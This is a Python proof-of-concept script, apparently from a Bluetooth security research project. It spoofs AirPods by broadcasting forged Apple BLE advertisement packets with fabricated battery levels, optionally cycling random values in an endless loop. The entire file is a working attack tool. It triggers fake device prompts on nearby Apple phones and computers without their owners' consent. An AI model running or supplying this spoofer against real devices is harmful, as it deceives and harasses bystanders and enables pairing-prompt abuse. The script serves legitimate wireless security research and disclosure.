#!/usr/bin/env python3
# Author: Dmitry Chastuhin
# Twitter: https://twitter.com/_chipik

# web: https://hexway.io
# Twitter: https://twitter.com/_hexway

import random
import hashlib
import argparse
from time import sleep
import bluetooth._bluetooth as bluez
from utils.bluetooth_utils import (toggle_device, start_le_advertising, stop_le_advertising)

help_desc = '''
AirPods advertise spoofing PoC
---chipik
'''

parser = argparse.ArgumentParser(description=help_desc, formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-i', '--interval', default=200, type=int, help='Advertising interval')
parser.add_argument('-r', '--random', action='store_true', help='Send random charge values')
args = parser.parse_args()

dev_id = 0  # the bluetooth device is hci0
toggle_device(dev_id, True)

data1 = (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x01, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45)
left_speaker = (random.randint(1, 100),)
right_speaker = (random.randint(1, 100),)
case = (random.randint(128, 228),)
data2 = (0xda, 0x29, 0x58, 0xab, 0x8d, 0x29, 0x40, 0x3d, 0x5c, 0x1b, 0x93, 0x3a)

try:
    sock = bluez.hci_open_dev(dev_id)
except:
    print("Cannot open bluetooth device %i" % dev_id)
    raise

print("Start advertising...")
if args.random:
    while True:
        try:
            sock = bluez.hci_open_dev(dev_id)
        except:
            print("Cannot open bluetooth device %i" % dev_id)
            raise
        left_speaker = (random.randint(1, 100),)
        right_speaker = (random.randint(1, 100),)
        case = (random.randint(128, 228),)
        start_le_advertising(sock, adv_type=0x03, min_interval=args.interval, max_interval=args.interval,
                             data=(data1 + left_speaker + right_speaker + case + data2))
        sleep(2)
        stop_le_advertising(sock)
else:
    try:
        start_le_advertising(sock, adv_type=0x03, min_interval=args.interval, max_interval=args.interval,
                             data=(data1 + left_speaker + right_speaker + case + data2))
        while True:
            sleep(2)
    except:
        stop_le_advertising(sock)
        raise
